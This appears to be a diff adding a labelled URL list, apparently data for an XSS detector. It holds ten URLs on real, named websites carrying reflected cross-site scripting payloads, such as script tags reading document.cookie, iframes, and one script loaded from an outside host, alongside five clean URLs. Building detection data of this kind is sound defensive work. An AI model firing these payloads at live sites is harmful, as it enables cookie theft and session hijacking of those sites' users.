@@ -1,0 +1,18 @@
+URL XSS:
+http://www.ilquaderno.it/commenta-articolo.php?idart=46069%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E
+http://bbs.cibmall.net/eccredit.php?action=list&uid="><script>alert(/XSSED/);</script>
+http://search.iwsearch.net/?mysearch=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E
+http://ratemyserver.net/checkstatus.php?id=10158&name=<iframe src=//xssed.com>
+https://www.bluetooth.org/apps/content/Banner.aspx?banner_id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+http://www.eztakes.com/store/search/summary?lid=header&searchWords=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E
+http://www.meteoalarm.eu/index2.php?lang=&country=NL&day=1%22'%3E%3Cscript%20src=http://ha.ckers.org/xss.js%3E%3C/script%3E
+http://www.frieslandbank.nl/Pages/Zoeken.aspx?Trefwoorden=<script>alert(document.cookie)</script>
+http://ask.hrmdirect.com/employment/view.php?req=%3Cscript%3Ealert(%22Milisx%22)%3C/script%3E
+http://www.defence.lk/PrintPage.asp?fname=error%22%3E%3Cscript%20language=javascript%3Ealert(document.cookie);%3C/script%3E
+
+URL Non-XSS:
+https://www.recindia.nic.in/
+http://www.niua.org/
+http://mospi.nic.in/
+https://www.sarkaritel.com/
+http://textilescommittee.nic.in/
